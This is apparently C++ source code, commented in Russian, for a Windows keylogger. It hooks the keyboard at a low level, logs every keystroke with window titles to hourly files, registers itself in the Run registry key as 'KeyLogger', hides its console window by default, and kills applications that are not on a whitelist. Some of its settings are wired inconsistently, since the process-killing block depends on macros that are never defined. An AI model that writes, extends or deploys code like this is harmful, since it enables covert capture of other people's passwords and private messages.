#define UNICODE
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <vector>
#include <string>
#include <algorithm>
#include <tlhelp32.h>
#include <Psapi.h>
#include <thread>
#include <regex>
#include <stack>
#include <filesystem>
#include <unordered_map>

namespace fs = std::filesystem;

// Конфигурационные переменные (будут установлены из файла)
bool VISIBLE_WINDOW = false;
bool WAIT_FOR_BOOT = true;
bool IGNORE_MOUSE = true;
std::string OPERATION_MODE = "WHITELIST";

// Формат лога теперь неизменяемый - только default
const int LOG_FORMAT = 0;

// Конфигурация по умолчанию
std::unordered_map<std::string, std::string> config = {
    {"MODE", "WHITELIST"},
    {"VISIBILITY", "INVISIBLE"},
    {"BOOT_WAIT", "BOOTWAIT"},
    {"IGNORE_MOUSE", "TRUE"}
};

// Карта имен клавиш для default формата
const std::map<int, std::string> keyname{ 
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN, "\n" },
    {VK_SPACE, "_" },
    {VK_TAB, "[TAB]" },
    {VK_SHIFT, "[SHIFT]" },
    {VK_LSHIFT, "[LSHIFT]" },
    {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL, "[CONTROL]" },
    {VK_LCONTROL, "[LCONTROL]" },
    {VK_RCONTROL, "[RCONTROL]" },
    {VK_MENU, "[ALT]" },
    {VK_LWIN, "[LWIN]" },
    {VK_RWIN, "[RWIN]" },
    {VK_ESCAPE, "[ESCAPE]" },
    {VK_END, "[END]" },
    {VK_HOME, "[HOME]" },
    {VK_LEFT, "[LEFT]" },
    {VK_RIGHT, "[RIGHT]" },
    {VK_UP, "[UP]" },
    {VK_DOWN, "[DOWN]" },
    {VK_PRIOR, "[PG_UP]" },
    {VK_NEXT, "[PG_DOWN]" },
    {VK_OEM_PERIOD, "." },
    {VK_DECIMAL, "." },
    {VK_OEM_PLUS, "+" },
    {VK_OEM_MINUS, "-" },
    {VK_ADD, "+" },
    {VK_SUBTRACT, "-" },
    {VK_CAPITAL, "[CAPSLOCK]" },
};

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

char output_filename[32];
int cur_hour = -1;

// Глобальные переменные для хранения списков
std::vector<std::string> blacklist;
std::vector<std::string> whitelist;
std::vector<std::string> used_applications;

bool ReadConfigFile(const std::string& filename = "config.ini")
{
    std::ifstream file(filename);
    if (!file.is_open())
    {
        std::cout << "Config file not found, using default settings." << std::endl;
        return false;
    }

    std::string line;
    std::string current_section;
    
    while (std::getline(file, line))
    {
        // Убираем пробелы в начале и конце
        size_t start = line.find_first_not_of(" \t\r\n");
        if (start == std::string::npos) continue;
        
        size_t end = line.find_last_not_of(" \t\r\n");
        std::string trimmed = line.substr(start, end - start + 1);
        
        // Пропускаем пустые строки и комментарии
        if (trimmed.empty() || trimmed[0] == ';' || trimmed[0] == '#')
            continue;
            
        // Проверяем секцию
        if (trimmed[0] == '[' && trimmed.back() == ']')
        {
            current_section = trimmed.substr(1, trimmed.length() - 2);
            continue;
        }
        
        // Парсим ключ-значение
        size_t delimiter_pos = trimmed.find('=');
        if (delimiter_pos != std::string::npos)
        {
            std::string key = trimmed.substr(0, delimiter_pos);
            std::string value = trimmed.substr(delimiter_pos + 1);
            
            // Убираем пробелы вокруг ключа и значения
            key.erase(0, key.find_first_not_of(" \t"));
            key.erase(key.find_last_not_of(" \t") + 1);
            value.erase(0, value.find_first_not_of(" \t"));
            value.erase(value.find_last_not_of(" \t") + 1);
            
            config[key] = value;
        }
    }
    
    file.close();
    return true;
}

// Функция для применения конфигурации
void ApplyConfiguration()
{
    // Применяем настройки
    OPERATION_MODE = config["MODE"];
    
    if (config["VISIBILITY"] == "VISIBLE")
        VISIBLE_WINDOW = true;
    else
        VISIBLE_WINDOW = false;
        
    if (config["BOOT_WAIT"] == "NOWAIT")
        WAIT_FOR_BOOT = false;
    else
        WAIT_FOR_BOOT = true;
        
    if (config["IGNORE_MOUSE"] == "FALSE")
        IGNORE_MOUSE = false;
    else
        IGNORE_MOUSE = true;
        
    // Выводим текущую конфигурацию
    std::cout << "Current configuration:" << std::endl;
    std::cout << "Mode: " << OPERATION_MODE << std::endl;
    std::cout << "Visibility: " << (VISIBLE_WINDOW ? "VISIBLE" : "INVISIBLE") << std::endl;
    std::cout << "Boot wait: " << (WAIT_FOR_BOOT ? "ENABLED" : "DISABLED") << std::endl;
    std::cout << "Ignore mouse: " << (IGNORE_MOUSE ? "YES" : "NO") << std::endl;
}

// Функция для проверки соответствия по шаблону (нестрогое сравнение)
bool PatternMatch(const std::string& text, const std::string& pattern)
{
    if (pattern.empty()) return false;
    
    // Если паттерн содержит *, используем поиск подстроки
    if (pattern.find('*') != std::string::npos)
    {
        std::string search_pattern = pattern;
        // Убираем * из паттерна для поиска
        size_t pos = search_pattern.find('*');
        if (pos != std::string::npos)
        {
            search_pattern = search_pattern.substr(0, pos);
        }
        
        return text.find(search_pattern) != std::string::npos;
    }
    
    // Обычное сравнение
    return text == pattern;
}

// Функция для завершения процесса по его ID
bool TerminateProcessByID(DWORD processID)
{
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    if (hProcess == NULL)
        return false;

    bool result = TerminateProcess(hProcess, 0) != 0;
    CloseHandle(hProcess);
    return result;
}

// Функция для добавления приложения в список использованных
void AddToUsedApplications(const std::string& app_name)
{
    // Функция для разделения строки на части по пробелам (>=5 символов)
    auto splitBySpaces = [](const std::string& str) {
        std::vector<std::string> parts;
        std::istringstream iss(str);
        std::string part;
        while (iss >> part) {
            if (part.length() >= 5) {
                parts.push_back(part);
            }
        }
        return parts;
    };

    // Разделяем новое приложение на части
    std::vector<std::string> new_parts = splitBySpaces(app_name);
    
    // Проверяем, есть ли уже похожее приложение в списке
    bool already_exists = false;
    
    for (const auto& existing_app : used_applications)
    {
        // Разделяем существующее приложение на части
        std::vector<std::string> existing_parts = splitBySpaces(existing_app);
        
        // Проверяем совпадение хотя бы одной части
        for (const auto& new_part : new_parts) {
            for (const auto& existing_part : existing_parts) {
                if (new_part == existing_part) {
                    already_exists = true;
                    std::cout << "SKIPPED: Application '" << app_name << "' already exists (matched part: '" << new_part << "')" << std::endl;
                    break;
                }
            }
            if (already_exists) break;
        }
        if (already_exists) break;
    }

    // Если такого приложения еще нет, добавляем его
    if (!already_exists)
    {
        used_applications.push_back(app_name);
        std::cout << "Added to used applications: " << app_name << std::endl;
        
        // Сохраняем в файл
        std::ofstream outfile("whitelist.txt", std::ios_base::app);
        if (outfile.is_open())
        {
            outfile << app_name << std::endl;
            outfile.close();
        }
    }
}

// Функция для проверки и завершения процессов по режиму (blacklist/whitelist)
void CheckAndTerminateProcesses(const char* window_title)
{
    if (window_title == nullptr || strlen(window_title) == 0)
        return;

    std::string title(window_title);
    std::string title_lower = title;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::tolower);

    // Добавляем приложение в список использованных
    AddToUsedApplications(title);

#ifdef MODE_BLACKLIST
    // Режим черного списка: блокируем только указанные приложения
    for (const auto& forbidden : blacklist)
    {
        std::string forbidden_lower = forbidden;
        std::transform(forbidden_lower.begin(), forbidden_lower.end(), forbidden_lower.begin(), ::tolower);

        if (PatternMatch(title_lower, forbidden_lower))
        {
            std::cout << "BLOCKED: Found blacklisted window '" << window_title << "' matching '" << forbidden << "'" << std::endl;
            
            DWORD processID = 0;
            HWND foreground = GetForegroundWindow();
            GetWindowThreadProcessId(foreground, &processID);

            if (processID != 0 && TerminateProcessByID(processID))
            {
                std::cout << "Process terminated successfully!" << std::endl;
            }
            break;
        }
    }

#elif defined(MODE_WHITELIST)
    // Режим белого списка: блокируем все, кроме указанных приложений
    bool allowed = false;
    
    // Функция для разделения строки на части по пробелам
    auto splitBySpaces = [](const std::string& str) {
        std::vector<std::string> parts;
        std::istringstream iss(str);
        std::string part;
        while (iss >> part) {
            if (part.length() >= 5) { // сохраняем только части >= 5 символов
                parts.push_back(part);
            }
        }
        return parts;
    };

    // Разделяем заголовок окна на части
    std::vector<std::string> title_parts = splitBySpaces(title_lower);
    
    for (const auto& allowed_app : whitelist)
    {
        std::string allowed_lower = allowed_app;
        std::transform(allowed_lower.begin(), allowed_lower.end(), allowed_lower.begin(), ::tolower);
        
        // Разделяем элемент белого списка на части
        std::vector<std::string> allowed_parts = splitBySpaces(allowed_lower);
        
        // Проверяем совпадение хотя бы одной части
        for (const auto& title_part : title_parts) {
            for (const auto& allowed_part : allowed_parts) {
                if (title_part == allowed_part) {
                    allowed = true;
                    std::cout << "ALLOWED: Found match '" << title_part << "' in whitelist pattern '" << allowed_app << "'" << std::endl;
                    break;
                }
            }
            if (allowed) break;
        }
        if (allowed) break;
    }

    if (!allowed && !whitelist.empty())
    {
        std::cout << "BLOCKED: Window '" << window_title << "' doesn't match any whitelist pattern!" << std::endl;
        
        DWORD processID = 0;
        HWND foreground = GetForegroundWindow();
        GetWindowThreadProcessId(foreground, &processID);

        if (processID != 0 && TerminateProcessByID(processID))
        {
            std::cout << "Process terminated successfully!" << std::endl;
        }
    }
#endif
}

// Функция для чтения blacklist.txt
bool ReadBlacklist()
{
    std::ifstream file("blacklist.txt");
    if (!file.is_open())
    {
        std::cout << "Blacklist file not found or cannot be opened." << std::endl;
        return false;
    }

    std::string line;
    while (std::getline(file, line))
    {
        size_t start = line.find_first_not_of(" \t\r\n");
        size_t end = line.find_last_not_of(" \t\r\n");
        
        if (start != std::string::npos && end != std::string::npos)
        {
            std::string trimmed = line.substr(start, end - start + 1);
            if (!trimmed.empty() && trimmed[0] != '#')
            {
                blacklist.push_back(trimmed);
                std::cout << "Added to blacklist: " << trimmed << std::endl;
            }
        }
    }

    file.close();
    std::cout << "Blacklist loaded with " << blacklist.size() << " entries." << std::endl;
    return true;
}

// Функция для чтения whitelist.txt
bool ReadWhitelist()
{
    std::ifstream file("whitelist.txt");
    if (!file.is_open())
    {
        std::cout << "Whitelist file not found. Creating new one." << std::endl;
        // Создаем пустой файл
        std::ofstream newfile("whitelist.txt");
        newfile.close();
        return true;
    }

    std::string line;
    while (std::getline(file, line))
    {
        size_t start = line.find_first_not_of(" \t\r\n");
        size_t end = line.find_last_not_of(" \t\r\n");
        
        if (start != std::string::npos && end != std::string::npos)
        {
            std::string trimmed = line.substr(start, end - start + 1);
            if (!trimmed.empty() && trimmed[0] != '#')
            {
                whitelist.push_back(trimmed);
                std::cout << "Added to whitelist: " << trimmed << std::endl;
            }
        }
    }

    file.close();
    std::cout << "Whitelist loaded with " << whitelist.size() << " entries." << std::endl;
    return true;
}

// Функция для обработки backspace в строке
std::string ProcessBackspaces(const std::string& content)
{
    std::string result;
    std::stack<char> char_stack;

    for (size_t i = 0; i < content.length(); i++)
    {
        if (content[i] == '[' && i + 10 < content.length())
        {
            // Проверяем, не начинается ли тут [BACKSPACE]
            std::string potential_tag = content.substr(i, 11);
            if (potential_tag == "[BACKSPACE]")
            {
                // Нашли [BACKSPACE] - удаляем предыдущий символ
                if (!char_stack.empty())
                {
                    char_stack.pop();
                }
                i += 10; // Пропускаем весь тег
                continue;
            }
        }
        char_stack.push(content[i]);
    }

    // Переносим стек в строку (в обратном порядке)
    while (!char_stack.empty())
    {
        result += char_stack.top();
        char_stack.pop();
    }
    std::reverse(result.begin(), result.end());
    
    return result;
}

// Функция для очистки повторяющихся последовательностей
// Функция для очистки повторяющихся последовательностей (без regex)
std::string CleanLogContent(const std::string& content)
{
    // Сначала обрабатываем backspace
    std::string processed_content = ProcessBackspaces(content);
    
    std::string result = processed_content;
    
    // Список тегов для обработки
    std::vector<std::string> tags = {
        "[LCONTROL]", "[RCONTROL]", "[LSHIFT]", "[RSHIFT]",
        "[ALT]", "[CAPSLOCK]", "[TAB]", "[ESCAPE]", "[BACKSPACE]"
    };
    
    // Обрабатываем каждый тег
    for (const auto& tag : tags)
    {
        std::string repeated_tag = tag;
        // Создаем строку с повторяющимся тегом (минимум 2 раза)
        while (repeated_tag.length() < tag.length() * 2)
        {
            repeated_tag += tag;
        }
        
        // Заменяем все повторения на один тег
        size_t pos = 0;
        while ((pos = result.find(repeated_tag, pos)) != std::string::npos)
        {
            result.replace(pos, repeated_tag.length(), tag);
            pos += tag.length();
        }
    }
    
    return result;
}

// Функция для обработки одного файла
bool CleanLogFile(const std::string& filepath)
{
    try
    {
        // Читаем содержимое файла
        std::ifstream infile(filepath);
        if (!infile.is_open())
        {
            return false;
        }
        
        std::stringstream buffer;
        buffer << infile.rdbuf();
        std::string original_content = buffer.str();
        infile.close();
        
        // Очищаем содержимое
        std::string cleaned_content = CleanLogContent(original_content);
        
        // Если содержимое изменилось, сохраняем обратно
        if (original_content != cleaned_content)
        {
            std::ofstream outfile(filepath);
            if (!outfile.is_open())
            {
                return false;
            }
            
            outfile << cleaned_content;
            outfile.close();
            return true;
        }
    }
    catch (const std::exception& e)
    {
        std::cout << "Error cleaning log file: " << e.what() << std::endl;
    }
    
    return false;
}

// Функция для поиска всех log файлов
std::vector<std::string> FindLogFiles(const std::string& directory)
{
    std::vector<std::string> log_files;
    
    try
    {
        if (fs::exists(directory))
        {
            for (const auto& entry : fs::directory_iterator(directory))
            {
                if (entry.is_regular_file())
                {
                    std::string filename = entry.path().filename().string();
                    if (filename.find(".log") != std::string::npos)
                    {
                        log_files.push_back(entry.path().string());
                    }
                }
            }
        }
    }
    catch (const std::exception& e)
    {
        std::cout << "Error scanning log directory: " << e.what() << std::endl;
    }
    
    return log_files;
}

// Функция очистки логов (запускается в отдельном потоке)
void LogCleanerThread()
{
    std::string log_dir = "logs";
    
    // Бесконечный цикл очистки каждые 5 минут
    while (true)
    {
        // Ищем все log файлы
        std::vector<std::string> log_files = FindLogFiles(log_dir);
        
        if (!log_files.empty())
        {
            // Обрабатываем каждый файл
            int cleaned_count = 0;
            for (const auto& filepath : log_files)
            {
                if (CleanLogFile(filepath))
                {
                    cleaned_count++;
                }
            }
            
            if (cleaned_count > 0)
            {
                std::cout << "Log cleaner: cleaned " << cleaned_count << " files" << std::endl;
            }
        }
        
        // Ждем 5 минут (300000 миллисекунд)
        Sleep(300000);
    }
}

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
bool AddToStartup()
{
    HKEY hKey;
    LONG lnRes = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);
    
    if (ERROR_SUCCESS != lnRes)
        return false;
    
    // Получаем путь к текущему исполняемому файлу
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    // Добавляем запись в реестр
    lnRes = RegSetValueExW(hKey, L"KeyLogger", 0, REG_SZ,
        (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(wchar_t));
    
    RegCloseKey(hKey);
    
    return (ERROR_SUCCESS == lnRes);
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        #ifdef UNICODE
        MessageBoxW(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
        #else
        MessageBoxA(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        #endif
    }
}
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
    
    // Используем IGNORE_MOUSE вместо директивы
    if (IGNORE_MOUSE && ((key_stroke == 1) || (key_stroke == 2)))
    {
        return 0; // ignore mouse clicks
    }
    
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;
    
    // get time
    struct tm tm_info;
    const time_t t = time(NULL);
    localtime_s(&tm_info, &t);

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        // Проверка и завершение процессов по выбранному режиму
        CheckAndTerminateProcesses(window_title);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
            
            std::cout << "DEBUG - Window changed to: " << window_title << std::endl;
        }
    }

    // Только default формат (убраны условия для других форматов)
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }

    // Determine current hour and base log file on that
    if (cur_hour != tm_info.tm_hour) {
        cur_hour = tm_info.tm_hour;
        output_file.close();
        strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
        output_file.open(output_filename, std::ios_base::app);
        std::cout << "Logging output to " << output_filename << std::endl;
    }

    output_file << output.str();
    output_file.flush();
    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting() 
{
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int main()
{
    // Читаем конфигурацию
    ReadConfigFile();
    ApplyConfiguration();
    AddToStartup();
    // Используем OPERATION_MODE вместо директив препроцессора
    if (OPERATION_MODE == "BLACKLIST")
    {
        std::cout << "Running in BLACKLIST mode" << std::endl;
        if (!ReadBlacklist())
        {
            std::cout << "Continuing without blacklist..." << std::endl;
        }
    }
    else if (OPERATION_MODE == "WHITELIST")
    {
        std::cout << "Running in WHITELIST mode" << std::endl;
        if (!ReadWhitelist())
        {
            std::cout << "Continuing without whitelist..." << std::endl;
        }
    }
    
    // Запускаем поток очистки логов
    std::thread cleaner_thread(LogCleanerThread);
    cleaner_thread.detach();
    
    // Call the visibility of window function.
    Stealth(); 
    
    // Используем WAIT_FOR_BOOT вместо директив
    if (WAIT_FOR_BOOT)
    {
        while (IsSystemBooting()) 
        {
            std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
            Sleep(10000);
        }
    }
    else
    {
        std::cout << "Skipping boot metrics check.\n";
    }
    
    SetHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}